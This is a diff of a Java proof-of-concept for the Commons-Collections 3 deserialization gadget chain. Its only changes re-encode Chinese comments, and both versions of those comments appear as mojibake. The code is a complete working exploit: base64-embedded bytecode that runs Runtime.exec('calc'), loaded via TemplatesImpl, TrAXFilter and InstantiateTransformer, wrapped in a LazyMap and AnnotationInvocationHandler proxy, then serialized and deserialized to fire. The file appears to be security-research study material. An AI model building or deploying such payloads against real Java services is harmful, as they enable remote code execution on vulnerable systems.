@@ -24,56 +24,56 @@ import java.util.Map;
 
 /**
  *
- * 3.1-3.2.1£¨jdk7u21º∞“‘«∞
+ * 3.1-3.2.1Ôºåjdk7u21Âèä‰ª•Ââç
  *
- * ∂‘ CC1 Ω¯––¡À“ª–©–ﬁ∏ƒ°£“˝»Î¡À TemplatesImpl ¿¥º”‘ÿ◊÷Ω⁄¬Î£¨»•µÙ¡À InvokerTransformer £¨“˝»Î¡À InstantiateTransformer
+ * ÂØπ CC1 ËøõË°å‰∫Ü‰∏Ä‰∫õ‰øÆÊîπ„ÄÇÂºïÂÖ•‰∫Ü TemplatesImpl Êù•Âä†ËΩΩÂ≠óËäÇÁ†ÅÔºåÂéªÊéâ‰∫Ü InvokerTransformer ÔºåÂºïÂÖ•‰∫Ü InstantiateTransformer
  */
 public class CommonsCollections3 {
     public static void main(String[] args) {
 
         try{
-            //◊÷Ω⁄¬Î
+            //Â≠óËäÇÁ†Å
             byte[] code = Base64.decode("yv66vgAAADMANAoACAAkCgAlACYIACcKACUAKAcAKQoABQAqBwArBwAsAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEAAWUBABVMamF2YS9sYW5nL0V4Y2VwdGlvbjsBAAR0aGlzAQAUTEhlbGxvVGVtcGxhdGVzSW1wbDsBAA1TdGFja01hcFRhYmxlBwArBwApAQAJdHJhbnNmb3JtAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhoYW5kbGVycwEAQltMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEACkV4Y2VwdGlvbnMHAC0BAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEAClNvdXJjZUZpbGUBABdIZWxsb1RlbXBsYXRlc0ltcGwuamF2YQwACQAKBwAuDAAvADABAARjYWxjDAAxADIBABNqYXZhL2xhbmcvRXhjZXB0aW9uDAAzAAoBABJIZWxsb1RlbXBsYXRlc0ltcGwBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAD3ByaW50U3RhY2tUcmFjZQAhAAcACAAAAAAAAwABAAkACgABAAsAAAB8AAIAAgAAABYqtwABuAACEgO2AARXpwAITCu2AAaxAAEABAANABAABQADAAwAAAAaAAYAAAAKAAQADAANAA8AEAANABEADgAVABAADQAAABYAAgARAAQADgAPAAEAAAAWABAAEQAAABIAAAAQAAL/ABAAAQcAEwABBwAUBAABABUAFgACAAsAAAA/AAAAAwAAAAGxAAAAAgAMAAAABgABAAAAFAANAAAAIAADAAAAAQAQABEAAAAAAAEAFwAYAAEAAAABABkAGgACABsAAAAEAAEAHAABABUAHQACAAsAAABJAAAABAAAAAGxAAAAAgAMAAAABgABAAAAGAANAAAAKgAEAAAAAQAQABEAAAAAAAEAFwAYAAEAAAABAB4AHwACAAAAAQAgACEAAwAbAAAABAABABwAAQAiAAAAAgAj");
 
-            //∑¥…‰…Ë÷√ Field
+            //ÂèçÂ∞ÑËÆæÁΩÆ Field
             TemplatesImpl templates = new TemplatesImpl();
             setFieldValue(templates, "_bytecodes", new byte[][]{code});
             setFieldValue(templates, "_name", "HelloTemplatesImpl");
             setFieldValue(templates,"_tfactory", new TransformerFactoryImpl());
 
 
-            //”ÎCC-1æﬂÃÂ«¯±æÕ «payload≤ª“ª—˘
-            //Transformer ˝◊È
+            //‰∏éCC-1ÂÖ∑‰ΩìÂå∫Âà´Â∞±ÊòØpayload‰∏ç‰∏ÄÊ†∑
+            //TransformerÊï∞ÁªÑ
             Transformer[] transformers = new Transformer[] {
                     new ConstantTransformer(TrAXFilter.class),
                     new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates})
             };
             ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
 
-            //LazyMap µ¿˝
+            //LazyMapÂÆû‰æã
             Map uselessMap = new HashMap();
             Map lazyMap = LazyMap.decorate(uselessMap,chainedTransformer);
 
-            //∑¥…‰ªÒ»°AnnotationInvocationHandler µ¿˝
+            //ÂèçÂ∞ÑËé∑ÂèñAnnotationInvocationHandlerÂÆû‰æã
             Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
             Constructor constructor = clazz.getDeclaredConstructor(Class.class, Map.class);
             constructor.setAccessible(true);
             InvocationHandler handler = (InvocationHandler) constructor.newInstance(Override.class, lazyMap);
 
-            //∂ØÃ¨¥˙¿Ì¿‡£¨Œ™¡À¥•∑¢ AnnotationInvocationHandler#invoke
+            //Âä®ÊÄÅ‰ª£ÁêÜÁ±ªÔºå‰∏∫‰∫ÜËß¶Âèë AnnotationInvocationHandler#invoke
             Map mapProxy = (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(), LazyMap.class.getInterfaces(), handler);
 
             InvocationHandler handler1 = (InvocationHandler) constructor.newInstance(Override.class, mapProxy);
 
 
-            //–Ú¡–ªØ
+            //Â∫èÂàóÂåñ
             ByteArrayOutputStream baos = new ByteArrayOutputStream();
             ObjectOutputStream oos = new ObjectOutputStream(baos);
             oos.writeObject(handler1);
             oos.flush();
             oos.close();
 
-            //≤‚ ‘∑¥–Ú¡–ªØ
+            //ÊµãËØïÂèçÂ∫èÂàóÂåñ
             ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray());
             ObjectInputStream ois = new ObjectInputStream(bais);
             ois.readObject();
@@ -86,7 +86,7 @@ public class CommonsCollections3 {
     }
 
 
-    //∑¥…‰…Ë÷√ Field
+    //ÂèçÂ∞ÑËÆæÁΩÆ Field
     public static void setFieldValue(Object object, String fieldName, Object value) {
         try {
             Field field = object.getClass().getDeclaredField(fieldName);
